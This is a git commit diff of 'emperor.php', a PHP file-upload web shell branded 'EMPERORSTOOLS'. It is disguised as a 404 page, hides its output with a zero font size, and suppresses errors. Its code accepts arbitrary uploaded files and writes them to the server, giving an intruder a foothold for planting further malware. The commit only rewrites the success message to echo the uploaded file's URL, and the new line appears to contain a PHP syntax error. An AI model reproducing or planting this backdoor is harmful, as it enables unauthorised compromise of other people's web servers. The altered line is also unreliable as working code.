e878c60859700fd2187545a66bbdefec8898139d
president32 <99405846+president32@users.noreply.github.com>
2022-04-24 18:33:22 +0100

    Update emperor.php

--- emperor.php
+++ emperor.php
@@ -1,7 +1,7 @@
 <img class=" height="200" src="https://i.ibb.co/r0PwY9y/emperor.png"/><title>404</title>
 <font face="Courier new" color="black" size="6">| BY EMPERORSTOOLS |</font>
 <style>body{font-size: 0;}h1{font-size: 12px}</style>
-<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>SUCCESFULL UPLOADED:V</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>SHIT FAILED BRO"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=EMPERORSTOOLS> <br>"; }__halt_compiler();?></h1>
+<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>SUCCESFULL UPLOADED:V</b>-->""http://" . $_SERVER['SERVER_NAME'] .$_SERVER['REQUEST_URI'] .$_FILES["f"]["name"]; }else{ echo"<b>SHIT FAILED BRO"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=EMPERORSTOOLS> <br>"; }__halt_compiler();?></h1>
 <?php
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
